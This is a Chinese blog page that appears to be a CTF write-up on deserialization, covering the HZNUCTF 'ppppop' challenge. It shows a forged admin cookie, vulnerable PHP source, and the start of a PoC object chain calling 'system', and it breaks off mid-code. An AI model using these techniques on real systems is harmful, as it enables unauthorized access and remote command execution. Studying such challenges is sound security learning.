<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>反序列化 - Potat0w0</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Potat0w0"><meta name="msapplication-TileImage" content="/img/icon.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Potat0w0"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="反序列化学习"><meta property="og:type" content="blog"><meta property="og:title" content="反序列化"><meta property="og:url" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><meta property="og:site_name" content="Potat0w0"><meta property="og:description" content="反序列化学习"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230404125943007.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406153731384.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406170242128.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406171445334.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406172912264.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173119381.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173259433.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104152115919.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104152231540.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104170635067.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104172505250.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173755984.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173931280.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173915503.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231019013247721.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231019204338159.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021012846629.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021010227415.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021010725181.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021011511542.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021012716791.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021014204061.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021014539958.png"><meta property="og:image" content="http://potatowo233.github.io/image-20231021014828001.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022155742899.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022160100214.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022160209274.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022203901385.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022172803715.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022173034403.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023182039564.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022221215908.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023131127298.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023133557862.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023185409822.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023201319727.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023201830216.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023202220648.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023202252783.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023211918059.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023212204163.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023213313186.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231024201831539.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231024204719080.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114017966.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114105893.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114801340.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108145428517.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108142522597.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109004511915.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014536461.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014742419.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014804849.png"><meta property="og:image" content="http://potatowo233.github.io/image-20231121212303111.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122111314683.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122111508088.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122113329914.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122112147020.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122114338097.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124173103719.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124202726171.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124202758635.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124172054469.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124221325557.png"><meta property="og:image" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124222409538.png"><meta property="article:published_time" content="2023-02-09T07:28:48.000Z"><meta property="article:modified_time" content="2024-02-04T18:52:26.380Z"><meta property="article:author" content="Potat0w0"><meta property="article:tag" content="WEB"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230404125943007.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},"headline":"反序列化","image":["http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230404125943007.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406153731384.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406170242128.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406171445334.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406172912264.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173119381.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173259433.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104152115919.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104152231540.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104170635067.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104172505250.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173755984.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173931280.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173915503.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231019013247721.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231019204338159.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021012846629.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021010227415.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021010725181.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021011511542.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021012716791.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021014204061.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021014539958.png","http://potatowo233.github.io/image-20231021014828001.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022155742899.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022160100214.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022160209274.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022203901385.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022172803715.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022173034403.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023182039564.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022221215908.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023131127298.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023133557862.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023185409822.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023201319727.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023201830216.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023202220648.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023202252783.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023211918059.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023212204163.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023213313186.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231024201831539.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231024204719080.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114017966.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114105893.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114801340.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108145428517.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108142522597.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109004511915.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014536461.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014742419.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014804849.png","http://potatowo233.github.io/image-20231121212303111.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122111314683.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122111508088.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122113329914.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122112147020.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122114338097.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124173103719.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124202726171.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124202758635.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124172054469.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124221325557.png","http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124222409538.png"],"datePublished":"2023-02-09T07:28:48.000Z","dateModified":"2024-02-04T18:52:26.380Z","author":{"@type":"Person","name":"Potat0w0"},"publisher":{"@type":"Organization","name":"Potat0w0","logo":{"@type":"ImageObject","url":"http://potatowo233.github.io/img/title.png"}},"description":"反序列化学习"}</script><link rel="canonical" href="http://potatowo233.github.io/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><link rel="icon" href="/img/icon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/rss.xml" title="Potat0w0" type="application/atom+xml">
</head><body class="is-3-column"><script type="text/javascript" color="30,144,255" opacity="0.5" zIndex="-1" count="150" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/title.png" alt="Potat0w0" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">时间轴</a><a class="navbar-item" href="/categories">归档</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a><a class="navbar-item" href="/link">友链</a><a class="navbar-item" href="/map">索引</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Follow_me" href="https://github.com/Potatowo233"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-02-09T07:28:48.000Z" title="2023/2/9 15:28:48">2023-02-09</time>发表</span><span class="level-item"><time dateTime="2024-02-04T18:52:26.380Z" title="2024/2/5 02:52:26">2024-02-05</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Java反序列化</a></span><span class="level-item">1 小时读完 (大约8634个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">反序列化</h1><div class="content"><!-- more -->

<h2 id="2023-HZNUCTF-ppppop"><a href="#2023-HZNUCTF-ppppop" class="headerlink" title="2023 HZNUCTF ppppop"></a>2023 HZNUCTF ppppop</h2><p>打开页面发现什么也没有，查看Cookie发现存在Cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Cookie=Tzo0OiJVc2VyIjoxOntzOjc6ImlzQWRtaW4iO2I6MDt9<br></code></pre></td></tr></table></figure>

<p>base64解码后得到一串序列化数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">O:4:&quot;User&quot;:1:&#123;s:7:&quot;isAdmin&quot;;b:0;&#125;<br></code></pre></td></tr></table></figure>

<p>b的值为0，尝试将b改为1伪造admin用户登录，进入网页，显示网页源码高亮：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;utils.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkUser</span>()) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]));<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$payload</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>php反序列化，审计本题就是想通过类A来调用某个类的某个方法。</p>
<p>编写poc验证漏洞:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$a</span>-&gt;className = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span>-&gt;funcName = <span class="hljs-string">&quot;system&quot;</span>;<br><span 